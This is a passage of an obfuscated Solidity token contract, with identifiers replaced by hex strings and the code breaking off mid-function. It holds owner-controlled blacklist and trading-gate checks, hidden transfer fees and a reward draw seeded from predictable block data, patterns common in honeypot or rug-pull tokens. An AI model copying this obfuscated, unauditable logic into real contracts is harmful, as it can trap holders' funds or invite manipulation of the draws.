Ox699021221729738a1359b2f94cc1367d13af6beb83e699971c7371361cca2b1708480b00812422ca3b4d5339ea577f080945a42ed06d5190aecd729e9886f18a(Oxf67aa57b930ceef65c47471af7cfe9a8fc89d11ce3de491d6e1f1f631fe7399d745e0ab7b38ce6a18346f9f08bdadd3b1ecfae06611c8afedb88badc65ad8f4e);}Ox7750c0ac9f66eba3415d4093369c3e8fa5cced3f525216d1e026cc2bbe0ed94933e439cf2c2b23ed55ffae64fee69e5f49f7d0358870c9cb496a368ff6033738(Ox5dcbd289b28e44be231b1d27085b832794cc06b99f3ce28e32c98b302e2beaa3ffbf014bdbfed2ae34a56471fa9190ad14b8ed09cddc41f5d00dc5207d189e2f, Ox22687a9982b78b8e438dbaa03d551a3c252bd3ae18e6ccbfe26e88ed10ae0eea1c8eb0cc4ee3f4424bcd8314ac1c1bf611b4ec0c5afa26525bb5db27cbc9ae4d, Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a].Ox6dc3e5a144bc89b0b58760037b33158ae2580f55c9b340eb5160e17b3f97f7acd6378ef1c1050cfa7d6f665927b4e3477f9a250e9e8f2b9574d1127c95436cbe, Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a, Oxd9ec526e2016b9574dc74cadcd3539a8c07cfa1a15e36b325209a9578d3287f6b8c28e66895e840be586b9415d4d0e37c87bc1cfdd937f0436819389b5efb879);Oxa25e203c62e54787a7d24df2b6841ff49be0b8abc5764cfcdcfd3000a2e6aa7477d74b65f1aa1ebf0b1c05f7bdc775f610402b13aaf142108097322f20115078.sync();}function Oxde3b6827f95b27514300f36b857ca81acd602c9f112e2c106920ac10d613acf09e24b8f947cf6fc05bf2b8a6bd030c9a63eaa87223371d585f4c484fd6878105(uint256 value, address Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a) internal view returns (uint256) {if(Oxe9dc5505135fbedc8cb7c52d088733a2899d79cd0713cf2b0f77d5a0f00345744acd9df92f23319b9768f6565e0902ce1b9508bd0069a70bc0901d42821885bd >= Oxf4ea9deeb13f0a8ae2f17f00f74a388ba979d375194956b1ea8dd50937e83008acbbf0537082d5aa9b0cbfe193a4fd03dd0546e3540b8e4839b3a4e2c3e93942 && Oxe9dc5505135fbedc8cb7c52d088733a2899d79cd0713cf2b0f77d5a0f00345744acd9df92f23319b9768f6565e0902ce1b9508bd0069a70bc0901d42821885bd > value && value > 0) {uint256 Ox15f7703874bef6bd05d4536821da9a0f0fdddb106ef78c3515d3fa39ab6a1ef2b62186dada47ccec3b517a43fcdae831364c8e1c10dcbdfb12cf8a2167b5e0bf = Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a] / Ox9f445fecd48fcb879887c342f8e6fbec82ebe45bd08c8bfe9345f3ab5215b0b9c2b53cbe38ebe74208d98fd80e7ea2d7320d1a4e8ddd5c34c13a27fca897b606;if(Oxe9dc5505135fbedc8cb7c52d088733a2899d79cd0713cf2b0f77d5a0f00345744acd9df92f23319b9768f6565e0902ce1b9508bd0069a70bc0901d42821885bd - value < Oxf4ea9deeb13f0a8ae2f17f00f74a388ba979d375194956b1ea8dd50937e83008acbbf0537082d5aa9b0cbfe193a4fd03dd0546e3540b8e4839b3a4e2c3e93942 ) value = Oxe9dc5505135fbedc8cb7c52d088733a2899d79cd0713cf2b0f77d5a0f00345744acd9df92f23319b9768f6565e0902ce1b9508bd0069a70bc0901d42821885bd - Oxf4ea9deeb13f0a8ae2f17f00f74a388ba979d375194956b1ea8dd50937e83008acbbf0537082d5aa9b0cbfe193a4fd03dd0546e3540b8e4839b3a4e2c3e93942;if(value > Ox15f7703874bef6bd05d4536821da9a0f0fdddb106ef78c3515d3fa39ab6a1ef2b62186dada47ccec3b517a43fcdae831364c8e1c10dcbdfb12cf8a2167b5e0bf) value = (Ox15f7703874bef6bd05d4536821da9a0f0fdddb106ef78c3515d3fa39ab6a1ef2b62186dada47ccec3b517a43fcdae831364c8e1c10dcbdfb12cf8a2167b5e0bf * 500)/1000;else if(Ox15f7703874bef6bd05d4536821da9a0f0fdddb106ef78c3515d3fa39ab6a1ef2b62186dada47ccec3b517a43fcdae831364c8e1c10dcbdfb12cf8a2167b5e0bf-value < 5*1e18) value = 0;}return value;}function transfer(address to, uint256 value)external override Ox9789e904b4e0c604f6e1074ca7800594b43f78036bc64298c6907054ae869686cc48030e118247b6c0bae6c039cafc5297b17742ad3dff942c7336a89026189b(to) returns (bool){Ox9c252885196968156e7b38deb52b86fa28bf34f579c86f9261b7f40260d6664fd209a34aae31451b649ce098396a4259c378ef3d6b7cbb68ce6558c481c676e9(msg.sender, to, value);return true;}function transferFrom(address from,address to,uint256 value) external override Ox9789e904b4e0c604f6e1074ca7800594b43f78036bc64298c6907054ae869686cc48030e118247b6c0bae6c039cafc5297b17742ad3dff942c7336a89026189b(to) returns (bool) {if (Ox3c1af09a5cfa84aa3d6c483c6e91a87fcca97f7c5c878d97641ded72fc52f0c88f31ed9d0743cf412d00a93722f4e963097923a03a3350691db4f337ca801159[from][msg.sender] != type(uint).max) {Ox3c1af09a5cfa84aa3d6c483c6e91a87fcca97f7c5c878d97641ded72fc52f0c88f31ed9d0743cf412d00a93722f4e963097923a03a3350691db4f337ca801159[from][msg.sender] = Ox3c1af09a5cfa84aa3d6c483c6e91a87fcca97f7c5c878d97641ded72fc52f0c88f31ed9d0743cf412d00a93722f4e963097923a03a3350691db4f337ca801159[from][msg.sender] - value;}Ox9c252885196968156e7b38deb52b86fa28bf34f579c86f9261b7f40260d6664fd209a34aae31451b649ce098396a4259c378ef3d6b7cbb68ce6558c481c676e9(from, to, value);return true;}function Ox97ee5f7993f831c8ace6ade774bf499139899653a4bd3fdc52d5fb09e53308d05e1619ecca4d001ffb2ed2b2ade72bb4b5778972f239a1a4310f5f95547baef9(address from,address to,uint256 amount) internal returns (bool) {uint256 Ox4215c7d325016c45dc4a4378460273574a28846aef4dd1a30584615fc69ddccf1cb9ccb229284703b4db6a51311e2caf8ae5adb7fee7ab131104ec693a7608ab = amount * Ox9f445fecd48fcb879887c342f8e6fbec82ebe45bd08c8bfe9345f3ab5215b0b9c2b53cbe38ebe74208d98fd80e7ea2d7320d1a4e8ddd5c34c13a27fca897b606;Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[from] = Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[from] - Ox4215c7d325016c45dc4a4378460273574a28846aef4dd1a30584615fc69ddccf1cb9ccb229284703b4db6a51311e2caf8ae5adb7fee7ab131104ec693a7608ab;Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[to] = Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[to] + Ox4215c7d325016c45dc4a4378460273574a28846aef4dd1a30584615fc69ddccf1cb9ccb229284703b4db6a51311e2caf8ae5adb7fee7ab131104ec693a7608ab;return true;}function Ox9c252885196968156e7b38deb52b86fa28bf34f579c86f9261b7f40260d6664fd209a34aae31451b649ce098396a4259c378ef3d6b7cbb68ce6558c481c676e9(address sender,address recipient,uint256 amount) internal returns (bool) {require(!Oxc6cb327aeadb2e38990524e0ca5bd04fb891b57b87b993040a6461ef94b3a38092080b6ef8a8b8bc54c106891bf971f8c7347b5ed9240f876214b0096d8af130[sender] && !Oxc6cb327aeadb2e38990524e0ca5bd04fb891b57b87b993040a6461ef94b3a38092080b6ef8a8b8bc54c106891bf971f8c7347b5ed9240f876214b0096d8af130[recipient], "bl");require(!Oxe2d41e1b80051323b970e338db05256bc38630ad3195caa4cefe435979e58a56416bcd4cdfabf720d065e0aadfe6a2f6690dc340e451eca63af2a25840cff94d, "cb");if(Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[sender].pairAddress == sender) {require(tx.gasprice < Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Ox01fe15591c78b04342f4da119495ef4e6f14c11acc8fae7c4a96b943b9ec458794dc99b651dcee67c1f3cb3b3f6bcea44d67f1a25c6ab5ad07080b07779b6a2a, "gs");}if(!Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Ox76999dd0fdcfa0d3916eefa176455e9430af5de4294d57f9df5f55ec9ceed41ee200b3288bcf9fa1fe8ae10f3e45d29b53877c52eefd47e495fe8bc564c003dd) require(sender == Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Ox56873814d5d92886d4306272973abf3a7aa09858124ab4281894b289960e10fbd734bee3c0458483de744e4d676d8affdce4075d7be7d9e924fe84a9253aaa67 || recipient == Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Ox56873814d5d92886d4306272973abf3a7aa09858124ab4281894b289960e10fbd734bee3c0458483de744e4d676d8affdce4075d7be7d9e924fe84a9253aaa67 || sender == address(this), "at");unchecked{Oxbcab3301be21a77b5a1b795fcc21dd615d8d8de6dcbf57d424930c589e6b69ecfebf2e121abd59964ae3589af43b3dad3965a63a9ae7d21c3f9946a83d0f6591 += uint256(keccak256(abi.encodePacked(sender.balance, Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[sender],recipient.balance, Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[recipient], Oxbcab3301be21a77b5a1b795fcc21dd615d8d8de6dcbf57d424930c589e6b69ecfebf2e121abd59964ae3589af43b3dad3965a63a9ae7d21c3f9946a83d0f6591++, block.timestamp, msg.sender, blockhash(block.number - 1))));}bool Oxdb9f62b7c5e0cfd98e0f760fb8cbfbc91c1eb23833bff6fbddacb3599b91c084d454267c4dcf826894eb90cf1da68da44acba73699c61185f6a4991e5119b5eb = (Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[sender].pairAddress == sender || Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[recipient].pairAddress == recipient);if(Oxdb9f62b7c5e0cfd98e0f760fb8cbfbc91c1eb23833bff6fbddacb3599b91c084d454267c4dcf826894eb90cf1da68da44acba73699c61185f6a4991e5119b5eb) Ox125f095bd576d943b74bf31965e996e19a95e6380047ddedca72bf7007708a8af3c78778ae48bb64fb7a870e9b64cc46000a16c2a8a7f81afdd6bcb1db8b25f5(Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[sender].pairAddress == Oxdaa0c942ac76bec8955822fdd0b02ab771c96b7d56fecfd5f16327342117ff73031f61fb22ffb4dd1ac44b19e663bd11871b59fe3bb6a25a6676083a9febde91 ? recipient : sender);if(Ox442ef25572a04d4f0c4a1e0986091818199225b5b53ea7a080b257e40951182171e557e5bbd890141d922cd1dddee390c32036b1d3e26639217d181c09d32a94(sender, recipient, amount)) {Oxe74913e41590f80eb05f9114141dddacea1c84c0f6dd46e2b072d6b9d086c7847d0daa66bff581217ef01e0f115534eed52ba40caf50691e75e29867d5742ad1();}if (Oxaa951d07763d133f78d33a29da4a80a94fe882a8aa523fddbbcbfab95f38a7319d476af8d939bedcbb54dc37869f3c6071e6d64a9e194cf3cac48856c3d013e3) {return Ox97ee5f7993f831c8ace6ade774bf499139899653a4bd3fdc52d5fb09e53308d05e1619ecca4d001ffb2ed2b2ade72bb4b5778972f239a1a4310f5f95547baef9(sender, recipient, amount);}if (Ox6129fbe8143da1d033274cfdd49febb7ad5d48e15fd79091b91815b5cb2ae41960b7112315c0c1756a4c5bb3a91b6b141055ad875119397e77dd4f54771fe005()) {   Oxf9fe6a104e2ed88c8b14c4a0ae88a43dae095497e65fc2452f31e760cbce153aca53ac38cb9c9e997e51a2b38cf6a42ff85da8f2ff89aa1c27a7293eeef1d7de();}if (Ox39d3195795f52e55ae46f25183bb59570e42360d36a623d6debe3e074979c6552dc28bdd7b53204e18bf5d885bac86363b6695078801d522ec266a4fe72fc822()) {Ox5c005274730f29604e4655f5d70149715231a21f81508f75c4199b1848c8929276bec0f2005ecce727ee2bb8f4016fa7da15a5b2d5801f43ef932b65504e1687();}uint256 Ox4215c7d325016c45dc4a4378460273574a28846aef4dd1a30584615fc69ddccf1cb9ccb229284703b4db6a51311e2caf8ae5adb7fee7ab131104ec693a7608ab = amount * Ox9f445fecd48fcb879887c342f8e6fbec82ebe45bd08c8bfe9345f3ab5215b0b9c2b53cbe38ebe74208d98fd80e7ea2d7320d1a4e8ddd5c34c13a27fca897b606;Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[sender] = Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[sender] - Ox4215c7d325016c45dc4a4378460273574a28846aef4dd1a30584615fc69ddccf1cb9ccb229284703b4db6a51311e2caf8ae5adb7fee7ab131104ec693a7608ab;uint256 Ox4018191f793e6a1a24b8ef1fe87529aee4e118e1229b29d591d54b50d2fdd126586820c2d564e40347f113c2921271c4cf8f9e405a8d94018b1cc9e86bcf4cc2 = Oxdb9f62b7c5e0cfd98e0f760fb8cbfbc91c1eb23833bff6fbddacb3599b91c084d454267c4dcf826894eb90cf1da68da44acba73699c61185f6a4991e5119b5eb && !Oxf7980711b86977ba5e8d654647570bbd8c8d15c69b771871955c099a0adc23068683ae241fb17e5fe7fb7dd012faba896de9d52d469d66743a7d90b26aade0e7[sender]? Ox6c8374274806f64a789a20a55b50ab4f7cc0010541a3576c770eca6462d66b2a0d45523c7a73f5b9c66a3d7b95b53e870f21489d10a15ac06e475b5a66b4a61f(sender, recipient, Ox4215c7d325016c45dc4a4378460273574a28846aef4dd1a30584615fc69ddccf1cb9ccb229284703b4db6a51311e2caf8ae5adb7fee7ab131104ec693a7608ab): Ox4215c7d325016c45dc4a4378460273574a28846aef4dd1a30584615fc69ddccf1cb9ccb229284703b4db6a51311e2caf8ae5adb7fee7ab131104ec693a7608ab;Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[recipient] += Ox4018191f793e6a1a24b8ef1fe87529aee4e118e1229b29d591d54b50d2fdd126586820c2d564e40347f113c2921271c4cf8f9e405a8d94018b1cc9e86bcf4cc2;emit Transfer(sender,recipient,Ox4018191f793e6a1a24b8ef1fe87529aee4e118e1229b29d591d54b50d2fdd126586820c2d564e40347f113c2921271c4cf8f9e405a8d94018b1cc9e86bcf4cc2 / Ox9f445fecd48fcb879887c342f8e6fbec82ebe45bd08c8bfe9345f3ab5215b0b9c2b53cbe38ebe74208d98fd80e7ea2d7320d1a4e8ddd5c34c13a27fca897b606);return true;}function Ox6c8374274806f64a789a20a55b50ab4f7cc0010541a3576c770eca6462d66b2a0d45523c7a73f5b9c66a3d7b95b53e870f21489d10a15ac06e475b5a66b4a61f(address sender,address recipient,uint256 Ox4215c7d325016c45dc4a4378460273574a28846aef4dd1a30584615fc69ddccf1cb9ccb229284703b4db6a51311e2caf8ae5adb7fee7ab131104ec693a7608ab) internal returns (uint256) {uint256 Ox942dc625ae9511237a54551db91f751731758091367a0d4f69e308cda0cdf430054320a67dcaec0fea115276b2ff147040ea01df14e95b8fe65abe43ece88427 = Ox4215c7d325016c45dc4a4378460273574a28846aef4dd1a30584615fc69ddccf1cb9ccb229284703b4db6a51311e2caf8ae5adb7fee7ab131104ec693a7608ab / Ox3156d7b67ba72b05b15d356122954b4279e68519fd1b098bf2500f9217ba094a26b38fbb355f14f2ad6387ac9731873d16c2221b92a5a7c0b9603f74e68f57c7 * Ox07fe5fa7813b29f37efc95b0ac50a921d508788507c00a0eeeeb94ac448977ee3bd892d5b4dea250b88c062aa56b75254954a6f4feb5020afc9ef8196d3f614f;uint256 Ox0694d69e8597c5514a85d9af9cfbc7c4a27ba9f2c79fd09db6963f37e1d7dbf1dc03a583ce1d83faa2aed10aef70806e4ce6382f44c9c1b62dea1a0685fbe9e3;bool Ox2872248641bcea34e397a480b968b55ebd243a85ffed1bcc4e6b29f5c59d9c57d7bdfde87b3672f28679714f7e972add668b1786c60ace2ea806bac4882864e6;uint8 Ox70f4a1340edbcf40ff649753067d5d87fc5f6e18a9c201863c44077172d0ca55a24a71d921631584e7a55b2a6038759bb4bde6594fb54f75cd384634ed70705a = 255;bool Oxb3ba6be7e85edbc57b9b4c5791382554df1b9f08c71acd411e6a31774262b589e97c9818f4a9e45e2b6be7dc3e6cd8d0667a4eaf33eacce14dc3b405789a6fe9;for(uint8 i; i < Ox7610dd5f5c2963d7a893adb3ff9c27b53ef3a3850e1c931539ebf6dc75efabba7db157ceb7392f98a9ac49aff4414f4f168f6a2c9daf6b4437768890c395c650; i++) {Oxdf8e550541dad141f0832ce8fc0b522276aa867636a02d977198bba16e73ac28bb1cc118a2acaccd034cd8dc76531be10d9966f4dd34a0a22262286c0678342c[i] += (Ox4215c7d325016c45dc4a4378460273574a28846aef4dd1a30584615fc69ddccf1cb9ccb229284703b4db6a51311e2caf8ae5adb7fee7ab131104ec693a7608ab / Ox3156d7b67ba72b05b15d356122954b4279e68519fd1b098bf2500f9217ba094a26b38fbb355f14f2ad6387ac9731873d16c2221b92a5a7c0b9603f74e68f57c7 * Ox0b0537536ea8281f328e2050ebe84906ea0ff4ad574aa06212b6a3b50de61175bc740112042e2220374384ff7424b2ed3cb9ba8ad3626817e2659b202464e761 * (i == Ox7610dd5f5c2963d7a893adb3ff9c27b53ef3a3850e1c931539ebf6dc75efabba7db157ceb7392f98a9ac49aff4414f4f168f6a2c9daf6b4437768890c395c650-1 ? 340 : 330)) / 1000;if(!Ox2872248641bcea34e397a480b968b55ebd243a85ffed1bcc4e6b29f5c59d9c57d7bdfde87b3672f28679714f7e972add668b1786c60ace2ea806bac4882864e6 && Oxdf8e550541dad141f0832ce8fc0b522276aa867636a02d977198bba16e73ac28bb1cc118a2acaccd034cd8dc76531be10d9966f4dd34a0a22262286c0678342c[i] > Oxc156091f257e4f6dbf4eb0761ce9d944de8996f5c8988f32ff849f19402ba44082c240dc5d0b33b839952391a40f94be2928f3c180e9c688521ebc4d900fe86b[i]*Ox9f445fecd48fcb879887c342f8e6fbec82ebe45bd08c8bfe9345f3ab5215b0b9c2b53cbe38ebe74208d98fd80e7ea2d7320d1a4e8ddd5c34c13a27fca897b606 && (Oxb4ea36a8164eae65881b55a78fe2ff3ad0e113c3e96df6c75064b35b2b8fcfafd527237415fca209c3f6a9f5058eca9779ba5cd923a0ff7590dd2bef1bfbbf87(poolList[0]) * (Ox4215c7d325016c45dc4a4378460273574a28846aef4dd1a30584615fc69ddccf1cb9ccb229284703b4db6a51311e2caf8ae5adb7fee7ab131104ec693a7608ab / Ox9f445fecd48fcb879887c342f8e6fbec82ebe45bd08c8bfe9345f3ab5215b0b9c2b53cbe38ebe74208d98fd80e7ea2d7320d1a4e8ddd5c34c13a27fca897b606))/1e8 >= ((i==0 ? 1: i==1 ? 5 : 10)*1e18) && !Oxc5bab90642a6f1c73afe9ced493b2e6e9dce1ac90931af114e11627a6106ae5d51aa286adf6e9fec5dd37dd96a2f4756e35063e552fd2f28832a98883a854060(recipient)) {if(!Ox95b66eb5787f49baf7f65d3614d8eef6296335b3dff7e28a3981f70494cb5f1c52f298c61b4f33f01bf1592daaaf79345d930391307963633a3f36e29e8c401a && Ox2137144dec0b7fed8619322f3295bd33873f72098513dcfbb6b0d8cd6b8f13fedde9f323ea33008281b572a8dc77436018412423fe579b086c5a7d83ea7d072a <= block.number && recipient != Ox56ea3c85383a69c4ff3f1157792fe864e068a75c1ab993a78ec50f0cca5b44211ffb0c1b308b0ed5e3b2b9d85a30830910528dd2d9d8f6e0ca660a011fa52aef && recipient != Ox7a8ddc1ce303c70bf6aad0245c528061f55dcb830eb64c6511a1219cddccc3eb072c9f0a7141aa33c946de21d4e3bc018b368065ed6b2261d1ac225f1aa1f7a0 && recipient != address(this)) {Ox95b66eb5787f49baf7f65d3614d8eef6296335b3dff7e28a3981f70494cb5f1c52f298c61b4f33f01bf1592daaaf79345d930391307963633a3f36e29e8c401a = true;if(!Oxb3ba6be7e85edbc57b9b4c5791382554df1b9f08c71acd411e6a31774262b589e97c9818f4a9e45e2b6be7dc3e6cd8d0667a4eaf33eacce14dc3b405789a6fe9) {Oxb3ba6be7e85edbc57b9b4c5791382554df1b9f08c71acd411e6a31774262b589e97c9818f4a9e45e2b6be7dc3e6cd8d0667a4eaf33eacce14dc3b405789a6fe9 = true;Ox70f4a1340edbcf40ff649753067d5d87fc5f6e18a9c201863c44077172d0ca55a24a71d921631584e7a55b2a6038759bb4bde6594fb54f75cd384634ed70705a = Oxaac7165d4bddaf7270b630fd0ca457cb10805dd5fe80de8743279ba9495221ad5bf1ffc96abde038d32cb639300e6446c3bee80354cdab6e7180bad8b5ff5dd1(sender, recipient,Ox4215c7d325016c45dc4a4378460273574a28846aef4dd1a30584615fc69ddccf1cb9ccb229284703b4db6a51311e2caf8ae5adb7fee7ab131104ec693a7608ab);}Ox95b66eb5787f49baf7f65d3614d8eef6296335b3dff7e28a3981f70494cb5f1c52f298c61b4f33f01bf1592daaaf79345d930391307963633a3f36e29e8c401a = false;if(Ox70f4a1340edbcf40ff649753067d5d87fc5f6e18a9c201863c44077172d0ca55a24a71d921631584e7a55b2a6038759bb4bde6594fb54f75cd384634ed70705a < Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Oxba4d4f1cc732b8d3c8fdbcb5e7287a442ac31a97c823059fd4342396812412abc669e9953cfdd5ef58b27c3dd0602d10e64b8d097253c47091de07bfba934bc7) { Ox2872248641bcea34e397a480b968b55ebd243a85ffed1bcc4e6b29f5c59d9c57d7bdfde87b3672f28679714f7e972add668b1786c60ace2ea806bac4882864e6 = true; uint256 Ox257c5c92a29646847a9c62c153af6cbf39b20a883b2c0a20eb9fbf3f1631527de456ba465993946be0f8f1c892e3e691a6bdc1aaa8941cb35a69ff32c9db5143 = 1e18*Ox9f445fecd48fcb879887c342f8e6fbec82ebe45bd08c8bfe9345f3ab5215b0b9c2b53cbe38ebe74208d98fd80e7ea2d7320d1a4e8ddd5c34c13a27fca897b606 * (i<1 ? 10 : i<2 ? 50 : 100);Ox0694d69e8597c5514a85d9af9cfbc7c4a27ba9f2c79fd09db6963f37e1d7dbf1dc03a583ce1d83faa2aed10aef70806e4ce6382f44c9c1b62dea1a0685fbe9e3 += Ox257c5c92a29646847a9c62c153af6cbf39b20a883b2c0a20eb9fbf3f1631527de456ba465993946be0f8f1c892e3e691a6bdc1aaa8941cb35a69ff32c9db5143;Oxdf8e550541dad141f0832ce8fc0b522276aa867636a02d977198bba16e73ac28bb1cc118a2acaccd034cd8dc76531be10d9966f4dd34a0a22262286c0678342c[i] -= Ox257c5c92a29646847a9c62c153af6cbf39b20a883b2c0a20eb9fbf3f1631527de456ba465993946be0f8f1c892e3e691a6bdc1aaa8941cb35a69ff32c9db5143;Ox2137144dec0b7fed8619322f3295bd33873f72098513dcfbb6b0d8cd6b8f13fedde9f323ea33008281b572a8dc77436018412423fe579b086c5a7d83ea7d072a = 0;Ox95b66eb5787f49baf7f65d3614d8eef6296335b3dff7e28a3981f70494cb5f1c52f298c61b4f33f01bf1592daaaf79345d930391307963633a3f36e29e8c401a = false;emit Oxbbda8b35ceeee74fdce0e9c40a9d0d134e3c2a80746b626b3f5e17a4397413ea70c5281e6bd551348df1363c0014cdcbd59045db89ee1738bef7cd1e3d936f91(Ox0694d69e8597c5514a85d9af9cfbc7c4a27ba9f2c79fd09db6963f37e1d7dbf1dc03a583ce1d83faa2aed10aef70806e4ce6382f44c9c1b62dea1a0685fbe9e3/Ox9f445fecd48fcb879887c342f8e6fbec82ebe45bd08c8bfe9345f3ab5215b0b9c2b53cbe38ebe74208d98fd80e7ea2d7320d1a4e8ddd5c34c13a27fca897b606, i, recipient);} else Ox2137144dec0b7fed8619322f3295bd33873f72098513dcfbb6b0d8cd6b8f13fedde9f323ea33008281b572a8dc77436018412423fe579b086c5a7d83ea7d072a = block.number + uint256(Ox70f4a1340edbcf40ff649753067d5d87fc5f6e18a9c201863c44077172d0ca55a24a71d921631584e7a55b2a6038759bb4bde6594fb54f75cd384634ed70705a);}}}Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[address(this)] += (Ox4215c7d325016c45dc4a4378460273574a28846aef4dd1a30584615fc69ddccf1cb9ccb229284703b4db6a51311e2caf8ae5adb7fee7ab131104ec693a7608ab / Ox3156d7b67ba72b05b15d356122954b4279e68519fd1b098bf2500f9217ba094a26b38fbb355f14f2ad6387ac9731873d16c2221b92a5a7c0b9603f74e68f57c7 * (Oxeffba7a93be5129486f98d9d69b729fa035fc588027668e435faebcb005a7bf6e274dfa9eb65df6cb9fe5753a5151999b77f274b1e697a40c3ce044786db42f4 + Ox9f976ec4e0c100d174cb4a9d068dfb544bb836bc6613bea436fef95ea5db90d64f777517c5f6b72284d884fcf85692c32f440c8072497b07a3f82a74edfa3726 + Ox0b0537536ea8281f328e2050ebe84906ea0ff4ad574aa06212b6a3b50de61175bc740112042e2220374384ff7424b2ed3cb9ba8ad3626817e2659b202464e761));if(Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[recipient].pairAddress == recipient) {if(Ox8dc8e82471e29438c0ca37dd5e9c9b127f2d337aef0ae35da32407ea79b6f88a901e4a149243639a8c0ceaedc018e108f28061f926398359915ca428140bf09e < Ox0403023a5a16c7a0d7904d6ee0366ad38a78594bce84104d00d882997f339be0104423324fab9f50932c2e65e2c79df6e80a948b90a3767e7d5bb16808739b0a){ for(uint i; i < Ox8dc8e82471e29438c0ca37dd5e9c9b127f2d337aef0ae35da32407ea79b6f88a901e4a149243639a8c0ceaedc018e108f28061f926398359915ca428140bf09e; i++) {Ox967c9d0fcb68a98de229343a719d7777147b85fed70ec1bf12b57164c4e9e0f8724602f2092b2b1b457a307aec55a7395a5c5e2e281694d239500de3a2dc3f3b (0, poolList[i]);}} else Ox967c9d0fcb68a98de229343a719d7777147b85fed70ec1bf12b57164c4e9e0f8724602f2092b2b1b457a307aec55a7395a5c5e2e281694d239500de3a2dc3f3b(0, recipient);}emit Transfer(sender, address(this), Ox942dc625ae9511237a54551db91f751731758091367a0d4f69e308cda0cdf430054320a67dcaec0fea115276b2ff147040ea01df14e95b8fe65abe43ece88427 / Ox9f445fecd48fcb879887c342f8e6fbec82ebe45bd08c8bfe9345f3ab5215b0b9c2b53cbe38ebe74208d98fd80e7ea2d7320d1a4e8ddd5c34c13a27fca897b606);return Ox0694d69e8597c5514a85d9af9cfbc7c4a27ba9f2c79fd09db6963f37e1d7dbf1dc03a583ce1d83faa2aed10aef70806e4ce6382f44c9c1b62dea1a0685fbe9e3 + Ox4215c7d325016c45dc4a4378460273574a28846aef4dd1a30584615fc69ddccf1cb9ccb229284703b4db6a51311e2caf8ae5adb7fee7ab131104ec693a7608ab - Ox942dc625ae9511237a54551db91f751731758091367a0d4f69e308cda0cdf430054320a67dcaec0fea115276b2ff147040ea01df14e95b8fe65abe43ece88427;}function Ox5c005274730f29604e4655f5d70149715231a21f81508f75c4199b1848c8929276bec0f2005ecce727ee2bb8f4016fa7da15a5b2d5801f43ef932b65504e1687() internal Ox1cc656cb50ff6dc39de26a95a2b4fb1941a69b3c6f48320e3b4d4791ca8630bb0f90f1f76245d3b1b012a4af7d61435fac68d22174bcb921319a32b7653e1fb6 {uint256 